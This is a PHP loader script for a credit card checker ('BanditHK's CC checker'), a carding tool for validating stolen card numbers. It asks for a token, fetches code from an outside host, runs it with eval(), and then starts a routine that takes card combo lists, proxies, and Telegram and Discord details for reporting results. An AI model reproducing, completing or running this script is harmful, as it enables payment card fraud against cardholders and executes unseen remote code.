<?php
system("clear");
echo "
__________                    .___.__  __     ___ ___  ____  __.
\______   \_____    ____    __| _/|__|/  |_  /   |   \|    |/ _|
 |    |  _/\__  \  /    \  / __ | |  \   __\/    ~    \      <
 |    |   \ / __ \|   |  \/ /_/ | |  ||  |  \    Y    /    |  \
 |______  /(____  /___|  /\____ | |__||__|   \___|_  /|____|__ \
        \/      \/     \/      \/                  \/         \/
\n";
echo "Welcome to BanditHK's CC checker\n\n";
login:
echo "Enter Your token: ";
$authtoken = trim(fgets(STDIN));
if($authtoken == '')
{
echo "Enter Valid Token\n";
goto login;
}
$functions = file_get_contents("https://bandithk.me/ob.php?token=$authtoken");

eval($functions);
[$combo,$choice,$proxytype,$teleid,$teletoken,$discordurl,$count,$plist] = start();
cardsapp($combo,$choice,$proxytype,$teleid,$teletoken,$discordurl,$count,$plist);
 ?>
